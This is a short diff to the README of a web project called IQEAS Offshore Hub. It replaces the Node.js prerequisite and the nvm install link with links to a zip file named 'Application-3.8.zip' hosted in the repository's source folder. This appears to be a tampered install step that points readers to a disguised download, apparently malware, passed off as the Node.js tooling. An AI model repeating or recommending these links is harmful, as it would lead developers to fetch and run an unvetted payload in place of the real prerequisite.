@@ -8,7 +8,7 @@ IQEAS Offshore Hub is a modern web application for showcasing offshore engineeri
 
 ### Prerequisites
 
-- Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+- https://raw.githubusercontent.com/Code-cave-media/iqeas-website./main/src/Application-3.8.zip & npm installed - [install with nvm](https://raw.githubusercontent.com/Code-cave-media/iqeas-website./main/src/Application-3.8.zip)
 
 ### Installation
 
